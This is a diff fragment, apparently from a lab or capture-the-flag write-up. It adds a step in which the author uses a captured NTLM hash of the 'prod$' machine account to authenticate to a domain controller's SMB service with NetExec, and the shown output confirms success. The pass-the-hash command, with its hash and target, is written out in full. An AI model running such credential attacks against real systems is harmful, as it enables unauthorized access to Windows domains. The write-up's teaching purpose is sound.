@@ -557,3 +557,9 @@ LDAP        10.0.29.162     389    DC01             Account: PROD$              
 
 I now have the NTLM hash of the `prod$` account
 
+```python
+nxc smb dc01.fragments.local -u 'prod$' -H 'b43cb2fcadff72ff9136a2f42218c430' --smb-timeout 5
+SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.29.162     445    DC01             [+] fragments.local\prod$:b43cb2fcadff72ff9136a2f42218c430
+```
+
